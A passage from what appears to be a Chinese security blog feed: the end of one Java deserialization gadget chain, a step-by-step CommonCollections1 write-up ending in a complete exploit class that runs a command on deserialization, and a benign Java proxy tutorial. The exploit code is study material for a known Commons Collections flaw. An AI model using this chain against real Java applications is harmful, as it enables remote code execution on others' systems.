hashSet.add(&quot;T0dis&quot;);        Field HashSet_map =  Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);        HashSet_map.setAccessible(true);        HashMap hashSetMap = (HashMap) HashSet_map.get(hashSet);        Field table =  Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);        table.setAccessible(true);        Object[] hashMapTable = (Object[]) table.get(hashSetMap);        Object node = hashMapTable[0];        if(node == null) &#123;            node = hashMapTable[1];        &#125;        Field key =  node.getClass().getDeclaredField(&quot;key&quot;);        key.setAccessible(true);        key.set(node, tiedmap);        serialize(hashSet);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException&#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonCollections1</title>
      <link href="/2023/04/04/CommonCollections1/"/>
      <url>/2023/04/04/CommonCollections1/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonCollections1"><a href="#CommonCollections1" class="headerlink" title="CommonCollections1"></a>CommonCollections1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Commons Collections是反序列化漏洞学习过程中不可缺少的一部分，Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。</p><p>Apache Commons Collections 中提供了一个 Transformer 的类，这个接口的功能就是将一个对象转换为另外一个对象，CC 链都依赖于此</p><p>下面的是跟着大佬的脚步，一步一步分析，从零开始一层一层往上找链子</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>然后下载sun包，点击zip</p><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p>下载后解压，把 jdk-af660750b2f4&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun 放到jdk中src⽂件夹中，默认有个src.zip 需要先</p><p>解压</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554777.png" alt="image-20230405101946093"></p><p>把src⽂件加载进来</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554932.png" alt="image-20230405102033235"></p><p>创建一个Maven项目，不用选择任何Maven模板；<br>在pom.xml中添加如下代码：</p><pre><code class="xml">&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;commons-collections&lt;/groupId&gt;            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;            &lt;version&gt;3.1&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;</code></pre><p>pom.xml:</p><pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;  &lt;groupId&gt;org.example&lt;/groupId&gt;  &lt;artifactId&gt;CC1&lt;/artifactId&gt;  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;  &lt;packaging&gt;jar&lt;/packaging&gt;  &lt;name&gt;CC1&lt;/name&gt;  &lt;url&gt;http://maven.apache.org&lt;/url&gt;  &lt;properties&gt;    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;  &lt;/properties&gt;  &lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.1&lt;/version&gt;    &lt;/dependency&gt;  &lt;/dependencies&gt;&lt;/project&gt;</code></pre><h2 id="找链子"><a href="#找链子" class="headerlink" title="找链子"></a>找链子</h2><p>找这条链子的最终目的是为了执行任意命令，比如说弹个计算器<code>calc</code></p><p>最简单的方法是</p><pre><code class="java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre><p>通过反射方式实现：</p><pre><code class="java">Runtime r = Runtime.getRuntime();Class c =Runtime.class;Method execMethod  = c.getMethod(&quot;exec&quot;,String.class);execMethod.invoke(r,&quot;calc&quot;);</code></pre><p>这里，我们不能够简单的实现这样的功能，而是找到一条链子，通过一层层的调用来执行命令</p><p>首先，要找到漏洞点</p><p>在<code>Apache Commons Collections</code>库中，里面有一个Transformer.java ,里面就这点东西</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554657.png" alt="image-20230404173415777"></p><p>这段代码定义了一个接口叫做 Transformer，它是一种用于类型转换或者提取数据的函数接口。该接口中只有一个单独的方法 transform(Object input) ，用于将输入对象转换成输出对象，而不改变输入对象本身。</p><p>查看一下实现Transformer的方法，总共有14个，漏洞点在<code>InvokerTransformer</code>里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555827.png" alt="image-20230404174817485"></p><p>跟进InvokerTransformer.java里，查看它的transform方法：</p><pre><code class="java">public Object transform(Object input) &#123;        if (input == null) &#123;            return null;        &#125;        try &#123;            Class cls = input.getClass();            Method method = cls.getMethod(iMethodName, iParamTypes);            return method.invoke(input, iArgs);                        &#125; catch (NoSuchMethodException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);        &#125; catch (IllegalAccessException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);        &#125; catch (InvocationTargetException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, ex);        &#125;    &#125;</code></pre><p>首先，该方法会判断输入对象是否为空，如果为空则直接返回 null。</p><p>如果输入对象不为空，则会获取其所属的类，并根据传入的方法名以及参数类型，反射获取该方法的 Method 对象。接下来，通过 method.invoke() 方法，对原输入对象调用该方法并传入参数，得到转换后的结果对象，并将其返回。</p><p>在这里我们可以看到刚刚反射执行<code>calc</code>的影子，并且<code>iMethodName (方法名)</code>，<code>iParamTypes (参数类型) </code>，<code>iArgs (参数)</code>都是可控的，可以实现任意方法调用</p><p>往上寻找它的构造函数：</p><pre><code class="java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;        super();        iMethodName = methodName;        iParamTypes = paramTypes;        iArgs = args;    &#125;</code></pre><p>可以尝试用这个方法弹个计算器</p><pre><code class="java"> Runtime r = Runtime.getRuntime(); new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;).transform(r);</code></pre><p>成功执行！</p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555629.png" alt="image-20230404190713998" style="zoom:50%;" /><p>现在相当于获取了链子的末端[危险方法：transform]，看看有哪些类调用了transform，这样我们才能往上走，Alt+F7</p><p>可以看到有19个调用，经过一番查找，找到TransformedMap</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555610.png" alt="image-20230404192653822"></p><pre><code class="java">protected Object checkSetValue(Object value) &#123;     return valueTransformer.transform(value); &#125;</code></pre><p><code>valueTransformer</code>是构造函数传来的，<code>value</code>还不能确定能不能控制</p><p>查看<code>TransformedMap</code>的构造函数：</p><pre><code class="java">protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;   super(map);   this.keyTransformer = keyTransformer;   this.valueTransformer = valueTransformer;&#125;</code></pre><p>该方法继承自 Map 接口的实现类，用于对 Map 中的 key 和 value 进行转换操作。其中，构造方法接收一个 Map 对象 map，以及两个 Transformer 对象 keyTransformer 和 valueTransformer，分别用于对 Map 中的 key 和 value 进行转换</p><p>因为这个构造函数是<code>protected</code>类型的，只能在类内部和子类中访问，看看哪个方法调用了它</p><p>直接往上一个方法就看到了,这里直接完成了上一个函数的操作，并且是<code>public static</code></p><pre><code class="java">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;      return new TransformedMap(map, keyTransformer, valueTransformer); &#125;</code></pre><p>到这里，我们是可以直接调用<code>decorate</code>方法，但是还没找到让程序执行到<code>checkSetValue</code> 的方式</p><p>查看一下有哪些方法调用了<code>checkSetValue</code>,直接Alt+F7</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555228.png" alt="image-20230404200924860"></p><p>找到了，并且只有一个，在<code>AbstractInputCheckedMapDecorator.java</code>中,如下</p><pre><code class="java">static class MapEntry extends AbstractMapEntryDecorator &#123;        /** The parent map */        private final AbstractInputCheckedMapDecorator parent;        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;            super(entry);            this.parent = parent;        &#125;        public Object setValue(Object value) &#123;            value = parent.checkSetValue(value);            return entry.setValue(value);        &#125;    &#125;</code></pre><p>并且发现<code>AbstractInputCheckedMapDecorator</code>是TransformedMap的父类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555347.png" alt="image-20230404201443638"></p><p>再看看有哪些地方调用了<code>setValue</code>方法，Alt+F7，发现有好多</p><p>经过大佬讲解，这个<code>MapEntry</code>名字已经给出了提示，大概就是遍历map的键值对时就会调用这个方法，这里的setValue()其实是被重写了的entry.setValue()</p><pre><code class="java">for(Map.Entry entry:Map.entrySet()) //遍历map&#123;    entry.getValue();&#125;   </code></pre><p>到这里应该通透了，可以试试用这个来弹计算器</p><pre><code class="java">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;);HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,invokerTransformer);for(Map.Entry entry:transformedMap.entrySet())  &#123;    entry.setValue(r);  &#125;</code></pre><p>OK,没猫病</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555088.png" alt="image-20230404203335268"></p><p>到现在已经找到后半条链了，现在要找到一个遍历Map的地方，并且使用了setValue()，就可以执行后面的链子了</p><p>继续找调用了setValue()的不同类，最好找到满足条件并且在readObject方法下的， 通过Alt+F7直接找到setValue()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555770.png" alt="image-20230405102345558"></p><p>在sun.reflect.annotation下发现了readObject⽅法，点进去查看，发现刚好满足条件，遍历集合，重写了readObject(),并且调用了setValue(),</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555873.png" alt="image-20230405102543904"></p><p>查看一下这个类的构造函数</p><p>构造⽅法传⼊两个参数，第⼀个是注解，第⼆个是map集合这个我们可以控制</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555799.png" alt="image-20230405103639780"></p><p>该类使⽤了class修饰 所以访问需要当前包下，这⾥需要使⽤反射加载才能调⽤这个构造⽅法</p><p>目前流程大概是这样子的：</p><pre><code class="java">Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;);HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,invokerTransformer);Class c= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);annotationInvocationHandlConstructor.setAccessible(true);serialize(o);unserialize(&quot;ser.bin&quot;);</code></pre><p>serialize和unserialize如下：</p><pre><code class="java">public static void serialize(Object obj) throws IOException&#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;</code></pre><p>⼤致是这样的，但是⽆法运⾏，因为序列化必须继承Serializable接⼝，Runtime ⽆法序列化，并且setValue的值⽆法控制</p><p>还有就是遍历map中需要绕过两个if判断</p><p>问题多多，需要一个个解决</p><p>先解决Runtime问题</p><p>虽然Runtime⽆法序列化，但是<code>Runtime.class</code>是可以序列化的</p><pre><code class="java">Class c = Runtime.class;Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);Runtime r = (Runtime) getRuntime.invoke(null, null);Method exec = c.getMethod(&quot;exec&quot;, String.class);exec.invoke(r,&quot;calc&quot;);</code></pre><pre><code class="java">//将上面的代码转换一下Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code></pre><p>这里可以发现，前一段的代码的输出，是后一段代码的输入，递归调用</p><p>有一个方法可以实现它</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556062.png" alt="image-20230405112001531"></p><p>只要传入要调用的方法的数组就行</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;   new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),   new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),   new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class);</code></pre><p>正常执行</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556399.png" alt="image-20230405112757891"></p><p>这里修改过后，后面的也需要更改</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;     new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),     new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),     new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//chainedTransformer.transform(Runtime.class);//InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;);HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,chainedTransformer);Class c= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);annotationInvocationHandlConstructor.setAccessible(true);Object o = annotationInvocationHandlConstructor.newInstance(Override.class,transformedMap);serialize(o);unserialize(&quot;ser.bin&quot;);</code></pre><p>现在还不能正常运行，还需要解决两个判断条件：</p><p>经过调试，发现已经进入两个判断了</p><p>！这咋和教程里的不一样，大佬调试的还没进判断里，我的就进去了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556765.png" alt="image-20230405115955396"></p><p>可能是我的jdk版本问题，我的是jdk 8u361，建议用下面的</p><p>环境jdk 8u65</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p>用大佬的图，继续</p><p>在上面的代码可以看出两个if 分别是检测key中的value是否为空，第⼆个if是判断参数是否强转</p><p>这⾥打个断点调试下</p><p>看到这⾥的memberType是传⼊的注解 Override，成员变量为空</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556123.png" alt="image-20230405151509078"></p><p>这⾥的memberValue是map中的Override，通过这个Override寻找这个value，下⼀步后，直接跳出判断，</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556077.png" alt="image-20230405151707774"></p><p>Override是单独的接⼝，没有成员⽅法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556475.png" alt="image-20230405151819169"></p><p>这⾥换成其他注解 Target</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556370.png" alt="image-20230405151852079"></p><pre><code class="java">修改前：Object o = annotationInvocationHandlConstructor.newInstance(Override.class,transformedMap);修改后：Object o = annotationInvocationHandlConstructor.newInstance(Target.class,transformedMap);</code></pre><p>替换后重新断点,发现找到了参数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556732.png" alt="image-20230405152131419"></p><p>这⾥第⼆个if也成功绕过</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556195.png" alt="image-20230405153735429"></p><p>还有一个问题，就是参数控制setValue的参数控制</p><p>点击setValue 进来，跳转到transformmap中的checkSetValue⽅法，value为固定的，⽆法控制执⾏任意类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556466.png" alt="image-20230405154030512"></p><p>在⼀开始查找transform时，会有⼀个ClosureTransformer类，这⾥的transform传递的参数不论是什么，都会返回⼀个常量，因此通过这个进⾏覆盖。</p><p>原本调⽤valueTransformer.transform(Object)，中途在换 ClosureTransformer.transform(Object) 只要最终调⽤到transform(Object)就可以执⾏任意类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556411.png" alt="image-20230405154346613"></p><p>在数组中添加⼀下代码，把value替换为Runtime.class即可执⾏命令</p><pre><code>new ConstantTransformer(Runtime.class)</code></pre><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>这就是最终的调⽤链,在最终调⽤transform的时候，⽤的是不同类的同名函数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051557054.png" alt="image-20230405154532332"></p><p>exp:</p><pre><code class="java">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class demo &#123;    public static void main(String[] args) throws Exception &#123;        //代码执行        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,                        Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,                        Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]                        &#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        //遍历map        HashMap&lt;Object,Object&gt; map = new HashMap();        map.put(&quot;value&quot;,&quot;aaa&quot;);        Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,chainedTransformer);                        //反射调用        Class c= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);        annotationInvocationHandlConstructor.setAccessible(true);        Object o = annotationInvocationHandlConstructor.newInstance(Target.class,transformedMap);        //序列化与反序列化        serialize(o);        unserialize(&quot;ser2.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException&#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser2.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代理与动态代理</title>
      <link href="/2023/04/02/Java%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
      <url>/2023/04/02/Java%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Java代理与动态代理"><a href="#Java代理与动态代理" class="headerlink" title="Java代理与动态代理"></a>Java代理与动态代理</h1><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理是一种设计模式，提供了对目标对象额外的访问方式，即通过代理对象访问目标对象，这样可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</p><p>简言之，代理模式就是设置一个中间代理来控制访问原目标对象，以达到增强原对象的功能和简化访问方式。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304031625114.png" alt="代理模式UML类图"></p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理是一种代理模式，它在程序运行之前就已经存在代理类的字节码文件，所以又称为编译时代理或者普通代理。在使用静态代理模式时，需要手动编写代理类，并在其中实现目标对象的方法调用。</p><p>下面举个例子： 黄*杰学长给学弟Tree买饭，买饭回来的路上还去买了奶茶</p><p>getrice.java 定义一个接口“买饭”</p><pre><code class="java">//抽象对象：买饭public interface getrice &#123;    public void Getrice();&#125;</code></pre><p>Person.java 真实角色, 实现getrice接口</p><pre><code class="java">public  class Person implements getrice &#123;    public void Getrice() &#123;        System.out.println(&quot;买饭&quot;);    &#125;&#125;</code></pre><p>StaticProxy.java 静态代理, </p><pre><code class="java">public class StaticProxy implements getrice&#123;    private Person person;    public StaticProxy(Person person)    &#123;        this.person = person;    &#125;    public void Getrice()    &#123;        person.Getrice();        System.out.println(&quot;路上买杯奶茶&quot;);        System.out.println(&quot;把饭拿给学弟&quot;);    &#125;&#125;</code></pre><p>Client.java</p><pre><code class="java">public class Client &#123;    public static void main(String[] args) &#123;        //Tree要吃饭        Person Tree = new Person();        //找到在食堂吃饭的黄*杰学长帮忙带个饭        StaticProxy jie = new StaticProxy(Tree);        //学长买饭        jie.Getrice();    &#125;&#125;</code></pre><p>结果：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304031625967.png" alt="image-20230403134900494"></p><p>在这个买饭的过程中，客户端Tree接触的是黄*杰（代理），看不到“饭”，当任然能买到饭。</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>相对于静态代理而言，动态代理是一种更为灵活的代理模式。在使用动态代理时，代理类并不是在程序运行之前就已经存在，而是在运行时通过反射等机制动态生成。Java中实现动态代理需要借助java.lang.reflect包中的Proxy类和InvocationHandler接口。</p><p>动态代理的出现就是为了解决传统静态代理模式的中的缺点。</p><p>具备代理模式的优点的同时，巧妙的解决了静态代理代码冗余，难以维护的缺点。</p><p>在Java中常用的有如下几种方式：</p><h3 id="JDK-原生动态代理"><a href="#JDK-原生动态代理" class="headerlink" title="JDK 原生动态代理"></a>JDK 原生动态代理</h3><p>getrice.java和Person.java代码不变</p><ol><li>首先实现一个InvocationHandler，方法调用会被转发到该类的invoke()方法。</li><li>然后在需要使用getrice的时候，通过JDK动态代理获取getrice的代理对象。</li></ol><p>DynamicProxy.java:</p><pre><code class="java">import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class DynamicProxy implements InvocationHandler &#123;    private Object target;    public  DynamicProxy(Object target) &#123;        this.target = target;    &#125;    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;        Object result = method.invoke(target, args);        System.out.println(&quot;路上买杯奶茶&quot;);        System.out.println(&quot;把饭拿给学弟&quot;);        return result;    &#125;&#125;</code></pre><p>客户使用动态代理调用</p><p>Client.java</p><pre><code class="java">import java.lang.reflect.Proxy;public class Client &#123;    public static void main(String[] args) &#123;        getrice Tree = new Person();        DynamicProxy jie = new DynamicProxy(Tree);        getrice proxy = (getrice) Proxy.newProxyInstance(                Tree.getClass().getClassLoader(),                Tree.getClass().getInterfaces(),                jie);        proxy.Getrice();    &#125;&#125;</code></pre><p>运行结果是和上面的一样的</p><p>上述代码的核心关键是<code>Proxy.newProxyInstance</code>方法，该方法会根据指定的参数动态创建代理对象。</p><p>它三个参数的意义如下：</p><ol><li><code>loader</code>，指定代理对象的类加载器</li><li><code>interfaces</code>，代理对象需要实现的接口，可以同时指定多个接口</li><li><code>handler</code>，方法调用的实际处理者，代理对象的方法调用都会转发到这里</li></ol><p><code>Proxy.newProxyInstance</code>会返回一个实现了指定接口的代理对象，对该对象的所有方法调用都会转发给<code>InvocationHandler.invoke()</code>方法。</p><p>因此，在<code>invoke()</code>方法里我们可以加入任何逻辑，比如修改方法参数，加入日志功能、安全检查功能等等……</p><p>getClass().getClassLoader()：</p><p>getClass() 方法是 Java Object 类中的一个方法，它的作用是返回当前对象所属类的 Class 对象。而 getClassLoader() 则是 Class 类中的一个方法，它可以用来获取该类的类加载器。在这段代码中，getClass().getClassLoader() 表示获取当前对象所属类的类加载器。具体来说，getClass() 方法会返回 DynamicProxy 类的 Class 对象，而 getClassLoader() 方法则会获取该类的类加载器。</p><h3 id="cglib-动态代理"><a href="#cglib-动态代理" class="headerlink" title="cglib 动态代理"></a>cglib 动态代理</h3><p>JDK动态代理是基于接口的,如果没有接口，就用cglib 动态代理</p><p><a href="https://github.com/cglib/cglib">CGLIB</a>(<em>Code Generation Library</em>)是一个基于<a href="http://www.baeldung.com/java-asm">ASM</a>的字节码生成库，它允许我们在运行时对字节码进行修改和动态生成。CGLIB通过继承方式实现代理。</p><p>首先，我们需要引入CGLIB库，例如Maven项目中的依赖：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;cglib&lt;/groupId&gt;    &lt;artifactId&gt;cglib&lt;/artifactId&gt;    &lt;version&gt;3.3.0&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>然后，我们定义一个类<code>HelloService</code>，不需要实现任何接口：</p><pre><code class="java">public class HelloService &#123;    public void sayHello() &#123;        System.out.println(&quot;Hello World!&quot;);    &#125;&#125;</code></pre><p>接着，定义一个实现<code>MethodInterceptor</code>接口的代理处理器<code>HelloServiceProxy</code>：</p><pre><code class="java">import net.sf.cglib.proxy.MethodInterceptor;import net.sf.cglib.proxy.MethodProxy;import java.lang.reflect.Method;public class HelloServiceProxy implements MethodInterceptor &#123;    @Override    public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable &#123;        System.out.println(&quot;Before sayHello&quot;);        Object result = proxy.invokeSuper(obj, args);        System.out.println(&quot;After sayHello&quot;);        return result;    &#125;&#125;</code></pre><p>最后，在<code>main</code>方法中使用代理对象调用原始对象方法：</p><pre><code class="java">import net.sf.cglib.proxy.Enhancer;public class Main &#123;    public static void main(String[] args) &#123;        HelloService helloService = new HelloService();        Enhancer enhancer = new Enhancer();        enhancer.setSuperclass(HelloService.class);        enhancer.setCallback(new HelloServiceProxy());        HelloService proxy = (HelloService) enhancer.create();        proxy.sayHello();    &#125;&#125;</code></pre><p>输出结果：</p><pre><code class="html">Before sayHelloHello World!After sayHello</code></pre><p>其实CGLIB和JDK代理的思路大致相同</p><p>上述代码中，通过CGLIB的<code>Enhancer</code>来指定要代理的目标对象、实际处理代理逻辑的对象。</p><p>最终通过调用<code>create()</code>方法得到代理对象，对这个对象所有非final方法的调用都会转发给<code>MethodInterceptor.intercept()</code>方法。</p><p>在<code>intercept()</code>方法里我们可以加入任何逻辑，同JDK代理中的<code>invoke()</code>方法</p><p>通过调用<code>MethodProxy.invokeSuper()</code>方法，我们将调用转发给原始对象，具体到本例，就是<code>Landlord</code>的具体方法。CGLIG中<code>MethodInterceptor</code>的作用跟JDK代理中的<code>InvocationHandler</code>很类似，都是方法调用的中转站。</p><h3 id="javasist-动态代理"><a href="#javasist-动态代理" class="headerlink" title="javasist 动态代理"></a>javasist 动态代理</h3><p>偷懒</p><p>pass</p><h2 id="静态代理和动态代理的区别"><a href="#静态代理和动态代理的区别" class="headerlink" title="静态代理和动态代理的区别"></a>静态代理和动态代理的区别</h2><p>静态代理：由程序员创建或者是由特定工具创建，在代码编译时就确定了被代理的类是一个静态代理。静态代理通常只代理一个类；<br>动态代理：在代码运行期间，运用反射机制动态创建生成。动态代理代理的是一个接口下的多个实现类。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS利用链</title>
      <link href="/2023/04/01/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>/2023/04/01/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
